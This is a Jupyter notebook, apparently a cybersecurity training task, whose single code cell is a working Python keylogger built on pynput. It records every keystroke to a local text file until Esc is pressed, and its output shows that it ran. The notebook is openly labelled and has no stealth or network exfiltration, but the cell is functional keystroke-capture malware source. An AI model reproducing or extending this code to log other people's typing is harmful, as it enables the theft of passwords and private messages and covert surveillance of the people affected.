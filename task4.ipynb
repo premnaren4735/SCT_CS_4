{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "67e40e44-3794-43a4-aa2c-bf6394cdfbde",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Keylogger started. Logging to: C:\\Users\\Lenovo\\Desktop\\notebook\\keylog.txt\n",
      "Press 'Esc' to stop.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "import os\n",
    "\n",
    "log_path = r\"C:\\Users\\Lenovo\\Desktop\\notebook\\keylog.txt\"\n",
    "\n",
    "os.makedirs(os.path.dirname(log_path), exist_ok=True)\n",
    "\n",
    "STOP_KEY = keyboard.Key.esc\n",
    "\n",
    "def on_press(key):\n",
    "    if key == STOP_KEY:\n",
    "        print(\"Esc key detected. Stopping logger...\")\n",
    "        return False\n",
    "    \n",
    "    try:\n",
    "        with open(log_path, \"a\") as f:\n",
    "            f.write(f\"{key.char}\")\n",
    "    except AttributeError:\n",
    "        with open(log_path, \"a\") as f:\n",
    "            f.write(f\"[{key}]\")\n",
    "\n",
    "print(f\"Keylogger started. Logging to: {log_path}\")\n",
    "print(\"Press 'Esc' to stop.\")\n",
    "keyboard.Listener(on_press=on_press).run()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "04d546b0-ff1a-4fc7-8ea7-c43c47dca2b0",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9011d65c-9236-45f0-ab10-4c5036720f30",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:base] *",
   "language": "python",
   "name": "conda-base-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
